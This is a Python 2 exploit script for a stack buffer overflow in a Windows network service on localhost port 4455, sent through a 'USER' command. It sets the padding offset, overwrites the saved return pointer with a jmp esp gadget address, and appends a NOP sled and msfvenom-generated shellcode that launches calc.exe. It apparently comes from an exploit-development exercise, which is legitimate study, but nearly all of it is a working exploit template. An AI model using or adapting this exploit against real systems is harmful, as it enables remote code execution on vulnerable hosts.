#!/usr/bin/env python2
import socket
import struct

RHOST = "127.0.0.1"
RPORT = 4455

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((RHOST, RPORT))

tolen_buf = 2200
offset_rsp = 146

ptr_jmp_esp = 0x56526683

#sub_esp_10 = "\x83\xec\x10"
#payload += sub_esp_10 # ESP points here
# payload generated with msfvenom -p windows/exec -b '\x00\x0A\x04\x72' -f python --var-name buf CMD=calc.exe EXITFUNC=thread

buf = ""
buf += "\xda\xc6\xd9\x74\x24\xf4\xb8\xc3\x9a\xc6\xd8\x5b\x29"
buf += "\xc9\xb1\x31\x83\xeb\xfc\x31\x43\x14\x03\x43\xd7\x78"
buf += "\x33\x24\x3f\xfe\xbc\xd5\xbf\x9f\x35\x30\x8e\x9f\x22"
buf += "\x30\xa0\x2f\x20\x14\x4c\xdb\x64\x8d\xc7\xa9\xa0\xa2"
buf += "\x60\x07\x97\x8d\x71\x34\xeb\x8c\xf1\x47\x38\x6f\xc8"
buf += "\x87\x4d\x6e\x0d\xf5\xbc\x22\xc6\x71\x12\xd3\x63\xcf"
buf += "\xaf\x58\x3f\xc1\xb7\xbd\xf7\xe0\x96\x13\x8c\xba\x38"
buf += "\x95\x41\xb7\x70\x8d\x86\xf2\xcb\x26\x7c\x88\xcd\xee"
buf += "\x4d\x71\x61\xcf\x62\x80\x7b\x17\x44\x7b\x0e\x61\xb7"
buf += "\x06\x09\xb6\xca\xdc\x9c\x2d\x6c\x96\x07\x8a\x8d\x7b"
buf += "\xd1\x59\x81\x30\x95\x06\x85\xc7\x7a\x3d\xb1\x4c\x7d"
buf += "\x92\x30\x16\x5a\x36\x19\xcc\xc3\x6f\xc7\xa3\xfc\x70"
buf += "\xa8\x1c\x59\xfa\x44\x48\xd0\xa1\x02\x8f\x66\xdc\x60"
buf += "\x8f\x78\xdf\xd4\xf8\x49\x54\xbb\x7f\x56\xbf\xf8\x60"
buf += "\xb4\x6a\xf4\x08\x61\xff\xb5\x54\x92\xd5\xf9\x60\x11"
buf += "\xdc\x81\x96\x09\x95\x84\xd3\x8d\x45\xf4\x4c\x78\x6a"
buf += "\xab\x6d\xa9\x09\x2a\xfe\x31\xe0\xc9\x86\xd0\xfc"


payload = "USER"
payload += "A"*(offset_rsp - len(payload)) # padding
payload += struct.pack("<I", ptr_jmp_esp) # SRP overwrite
#payload += "B"4
#payload += badchar_test
payload += "C"*(tolen_buf - len(payload)) # trailing padding
payload += '\x90'*40
payload += buf